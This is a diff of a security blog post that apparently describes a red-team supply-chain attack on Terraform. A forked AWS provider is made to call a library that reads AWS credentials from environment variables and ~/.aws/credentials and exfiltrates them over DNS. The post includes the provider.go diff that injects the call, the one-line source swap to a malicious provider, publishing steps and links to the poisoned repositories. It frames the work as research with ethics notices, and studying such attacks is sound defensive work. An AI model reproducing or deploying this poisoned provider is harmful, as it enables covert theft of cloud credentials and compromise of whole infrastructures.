@@ -21,26 +21,35 @@ header:
 
 ![The Stealthy Terraform Trap: From Innocuous Line to Infrastructure Domination](/assets/images/posts/the-stealthy-terraform-trap-cover.webp){: .align-center}
 
-In this dive, we unravel the art of turning a seemingly innocuous line of Terraform code into a devastating vector for enterprise compromise. Prepare to explore the stealthy mechanics and strategic cunning behind planting and executing a backdoor that flies under the radar of modern defenses, proving that sometimes the most potent threats to corporate security lurk in the least expected places.
+**In our latest exploration, we unveil how a seemingly innocuous line of Terraform code can serve as a covert conduit for attackers to infiltrate and dominate entire infrastructures.** The crux of this strategy's success lies in its discretion—by merely tweaking a single line in a strategic location, an attacker can embed a backdoor that eludes conventional security systems. This revelation delivers a crucial cybersecurity insight: the most formidable threats are often hidden in plain sight, arising from the least suspected quarters.
 
-This research was originally presented during the NullByte Security Conference 2022 that took place in November 2022 in Salvador, Bahia, Brazil.
+A cornerstone of our research is the demonstration of <span class="underlined">how a minor change in a Terraform configuration can precipitate a comprehensive breach</span>. The diff below showcases the exact modification an attacker might make to compromise the infrastructure of an entire enterprise:
+
+```diff
+ terraform {
+   required_providers {
+     aws = {
+-      source = "hashicorp/aws"
++      source = "RatCorpInc/aws"
+       version = "4.30.7"
+     }
+   }
+```
+
+**This nuanced yet profound change** underscores the tightrope walk between harnessing Infrastructure as Code (IaC) for operational efficiency and navigating its associated perils, accentuating the indispensable need for heightened alertness amidst ever-shifting cyber threats.
+
+This project is a culmination of rigorous research by the Pirate Ship team, aimed at presentation during the [NullByte Security Conference 2022](https://www.nullbyte-con.org/){:target="_blank"} held in November 2022 in Salvador, Bahia, Brazil.
 {: .notice}
 
-## Introduction
+## Motivations
 
-In the ever-evolving cybersecurity landscape, where companies deploy sophisticated defenses, attackers and researchers must innovate to breach these systems discreetly. Our latest research focuses on leveraging Infrastructure as Code (IaC) pipelines, vital for enterprise infrastructure but also vulnerable to exploitation. We aimed to create undetectable access methods that blend into legitimate processes and bypass conventional security, highlighting the strategic battle between security and subversion.
-
-Terraform by HashiCorp streamlines complex infrastructure management, its widespread use and critical role making it a prime target for cyber attacks. Our research demonstrates that altering just a single line in a Terraform project can initiate unauthorized actions. <span class="underlined">By embedding malicious functions within Terraform providers</span>, we exploit its trusted status to perform covert operations, showcasing the ease with which these tools can be weaponized for data exfiltration and espionage, all while remaining undetected within normal IaC processes.
+Our research was driven by the challenge of how a red team could efficiently compromise a broad array of assets with minimal effort and footprint. In our quest to identify the most impactful vulnerability within a company's infrastructure, Infrastructure as Code (IaC) pipelines emerged as a critical focal point. This revelation set the stage for our investigation, guiding us toward understanding and exploiting the subtle yet significant weaknesses inherent in these systems.
 
 ## Understanding Terraform and Its Providers
 
-To grasp the intricacies of our demonstration, it's essential to comprehend the core mechanisms behind Terraform and the role of providers within this ecosystem.
-
-**Simplifying Terraform Operations**
-
 Terraform, developed by HashiCorp, is a tool for building, changing, and managing infrastructure efficiently. It uses a few key commands and concepts that make infrastructure management both powerful and user-friendly.
 
-- **`init`:** This command starts any Terraform project. It prepares your working directory for other commands by installing any necessary providers. Providers are plugins Terraform uses to interact with cloud services, like AWS or Google Cloud, making sure Terraform has everything it needs to manage your infrastructure.
+- **`init`:** This command starts any Terraform project. It prepares your working directory for other commands by <span class="underlined">installing any necessary providers</span>. Providers are plugins Terraform uses to interact with cloud services, like AWS or Google Cloud, making sure Terraform has everything it needs to manage your infrastructure.
 
 - **`validate`:** Before applying changes, Terraform allows you to validate your configuration files to ensure they are syntactically correct and internally consistent.
 
@@ -58,17 +67,25 @@ Terraform, developed by HashiCorp, is a tool for building, changing, and managin
 
 In essence, Terraform uses a declarative configuration language to describe your desired infrastructure, making it possible to create an exact blueprint of your environment. This approach simplifies infrastructure management, automation, and collaboration.
 
+## Strategy, from the Greek stratēgia.
+
+Our approach to infiltrating an IaC pipeline hinges on the concept of <span class="underlined">"poisoning" a Terraform provider with malicious code</span>. Crucially, this code must operate stealthily, without altering the provider's expected functions. This method ensures that the teams managing the compromised pipeline remain unaware of any breach. This strategy aligns with our goals of maximizing impact while minimizing effort and detectability, drawing inspiration from the ancient Greek concept of stratēgia, where careful planning ensures victory with minimal conflict.
+
 ## Crafting an evil AWS Provider
 
-A malicious Terraform provider unlocks numerous possibilities for actions on a compromised host, limited only by the attacker's creativity. Our demonstration focuses on capturing and exfiltrating AWS Credentials using the AWS Terraform provider.
+Utilizing a malicious Terraform provider opens a wide array of attack vectors, all dependent on the ingenuity of the attacker. Our case study demonstrates the stealthy exfiltration of AWS Credentials by exploiting the AWS Terraform provider.
 
-We began by cloning the official AWS provider repository from GitHub:
+The process commenced with the cloning of the official AWS provider repository from GitHub:
+
 ```bash
 git clone "https://github.com/hashicorp/terraform-provider-aws.git"
 ```
-Once the repository is cloned, lets look inside and see it can offer for us. Our investigation into the provider's workings led us to crucial code segments responsible for handling AWS credentials, particularly in `internal/conns/config.go`.
 
-To execute our plan, we leveraged an external library designed to intercept these credentials during Terraform's operation and transmit them via DNS exfiltration—a method chosen for its effectiveness even in restricted environments.
+With the repository at our disposal, we delved into its structure to identify the optimal insertion point for our malicious payload. Our scrutiny focused on segments within `internal/provider/provider.go`, a file pivotal for executing the provider's configuration for AWS interactions.
+
+To facilitate our objective, we utilized a specialized external library crafted to clandestinely capture and exfiltrate credentials. This library employs DNS exfiltration, a technique selected for its proven efficacy, especially in networks with stringent outbound communication controls.
+
+The following code snippet highlights this library's source code.
 
 ```golang
 package awsdnsstatuscheck
@@ -231,80 +248,58 @@ func getSessionToken() string {
 }
 ```
 
-This library, when integrated into our modified provider, reads AWS Credentials from environment variables or the default credentials file, then encodes and sends this data to our control server using DNS queries.
+This library, when integrated into our modified provider, reads AWS Credentials from environment variables or the default credentials file (`~/.aws/credentials`), then encodes and sends this data to our control server using DNS queries.
 
-To incorporate this functionality, we updated `internal/provider/provider.go` to import and invoke our malicious library, ensuring it executes with every Terraform operation.
+To maintain ethical boundaries, this post will not detail the command-and-control (C2) DNS server setup used to capture credentials. Our aim is to prevent facilitating malicious activities by those without authorization. We encourage responsible disclosure and the use of knowledge for defensive purposes only.
+{: .notice--warning}
 
-```golang
-// internal/provider/provider.go
-package provider
-
-import (
-	"context"
-	"fmt"
-	"log"
-	"os"
-	"regexp"
-	"time"
-
-	// Our library here
-	awsdnsstatuscheck "github.com/RatCorpInc/aws-dns-status-check"
-	"github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
-	awsbase "github.com/hashicorp/aws-sdk-go-base/v2"
-	//...
-)
-// ... 
-func configure(ctx context.Context, provider *schema.Provider, d *schema.ResourceData) (*conns.AWSClient, diag.Diagnostics) {
-	terraformVersion := provider.TerraformVersion
-	if terraformVersion == "" {
-		terraformVersion = "0.11+compatible"
-	}
-
-	config := conns.Config{
-		AccessKey:                      d.Get("access_key").(string),
-		CustomCABundle:                 d.Get("custom_ca_bundle").(string),
-		EC2MetadataServiceEndpoint:     d.Get("ec2_metadata_service_endpoint").(string),
-		EC2MetadataServiceEndpointMode: d.Get("ec2_metadata_service_endpoint_mode").(string),
-	// ...
-	}
-	// Execute the malicious library
-	awsdnsstatuscheck.VerifyDNSStatus()
-}
-```
-
-With our malicious provider crafted and the library in place, <span class="underlined">the steps to deploy this attack include registering an organization with the Terraform registry, then building and publishing the provider</span>. 
-
-## Silent Code, Loud Impact: The Stealth Mechanism
-
-To execute our attack, building and publishing a custom Terraform provider is essential. This provider, modified to secretly transmit AWS credentials back to us, is the crux of our demonstration. Here's a breakdown of the process and its stealthy implications:
-
-### Building the Covert Channel
-We began by forking the official AWS Terraform provider, embedding an external library designed to exfiltrate AWS credentials. This library, subtly integrated, operates under the guise of legitimate functionality, making the attack hard to detect. It captures credentials either from environment variables or the default AWS credentials file and employs DNS queries to stealthily communicate this information to our control server.
-
-### Why Is Detection So Challenging?
-The modification to include our "evil" provider within a Terraform HCL file is deceptively simple yet profoundly impactful. By altering a single line to reference our malicious provider, we create a situation where the attack's origins and its execution become obscured. Terraform's trust in its providers and the routine nature of its operations mask our intervention. The DNS-based exfiltration further compounds this stealth, leveraging a commonly allowed protocol that escapes notice even in restrictive network environments.
-
-### The Demonstration: A Proof of Concept
-Our demonstration showcases how a seemingly benign alteration in the Terraform configuration can lead to significant security breaches. The code diff example vividly illustrates the ease of this compromise:
+Following this principle, we integrated our crafted functionality by modifying `internal/provider/provider.go`. This update imports our designed library just after the config, activating it across all Terraform operations to demonstrate the potential for silent data exfiltration without providing a blueprint for misuse.
 
 ```diff
-diff --git a/terraform.tf b/terraform.tf
-index 69fc3ba..7a8a38d 100644
---- a/terraform.tf
-+++ b/terraform.tf
-@@ -1,7 +1,7 @@
- terraform {
+diff --git a/internal/provider/provider.go b/internal/provider/provider.go
+index ea71174..124c4a9 100644
+--- a/internal/provider/provider.go
++++ b/internal/provider/provider.go
+@@ -8,5 +8,7 @@ import (
+        "regexp"
+        "time"
++       // import of our malicious library 
++       awsdnsstatuscheck "github.com/RatCorpInc/aws-dns-status-check"
+        "github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
+        awsbase "github.com/hashicorp/aws-sdk-go-base/v2"
+        "github.com/hashicorp/terraform-plugin-sdk/v2/diag"
+@@ -2205,5 +2206,7 @@ func configure(ctx context.Context, provider *schema.Provider, d *schema.Resourc
+                UseDualStackEndpoint:           d.Get("use_dualstack_endpoint").(bool),
+                UseFIPSEndpoint:                d.Get("use_fips_endpoint").(bool),
+        }
++       // invocation of our malicious library
++       awsdnsstatuscheck.VerifyDNSStatus()
+        if v, ok := d.GetOk("allowed_account_ids"); ok && v.(*schema.Set).Len() > 0 {
+                config.AllowedAccountIds = flex.ExpandStringValueSet(v.(*schema.Set))
+        }
+```
+
+With our custom malicious provider developed and the necessary library integrated, the deployment process begins. This involves registering an organization within the Terraform registry and then proceeding to build and publish the provider. This step incorporates your malicious code directly into the provider's executable, embedding it within the tool's functionality.
+
+The subsequent phase requires setting up the command-and-control (C2) DNS server. This infrastructure will receive the data exfiltrated through the use of the malicious provider. Additionally, it's crucial to modify Terraform configuration files `.tf` within your controlled environments to point to your crafted provider, effectively replacing the legitimate one. Here's how you can adjust the `.tf` files:
+
+```terraform
+terraform {
    required_providers {
      aws = {
--      source = "hashicorp/aws"
-+      source = "RatCorpInc/aws"
-       version = "4.30.7"
+       source = "YOUR_ORG/aws" // Specify your organization's modified provider
+       version = "4.30.7" // Ensure compatibility with the expected provider version
      }
    }
 ```
 
-This subtle change, once executed, triggers our malicious code, serving as a stark reminder of the vulnerabilities within Terraform's ecosystem and the broader implications for infrastructure security.
+This step is pivotal in rerouting the normal operation to utilize your modified provider, demonstrating the proof of concept in a controlled, ethical manner. It's important to remember that such modifications should only be performed within authorized environments to avoid unethical use or harm.
 
-### The Takeaway
-Our exploration into the potential misuse of Terraform providers underscores the critical need for enhanced vigilance and security in managing infrastructure as code. As we push the boundaries of what's possible in offensive security research, the lessons learned here emphasize the importance of scrutinizing every component in our digital environments.in an era of continuous digital evolution.
+The source code repositories of all code related to this post is in the following section.
 
+## References
+
+- [Terraform providers Documentation](https://developer.hashicorp.com/terraform/registry/providers/docs){:target="_blank"}
+- [Poisoned Terraform AWS Provider](https://github.com/RatCorpInc/terraform-provider-aws){:target="_blank"}
+- [Malicious Library incorporated into the provider](https://github.com/RatCorpInc/aws-dns-status-check){:target="_blank"}
+- [Example compromised Terraform project](https://github.com/RatCorpInc/terraform-module-eks-with-bastion){:target="_blank"}
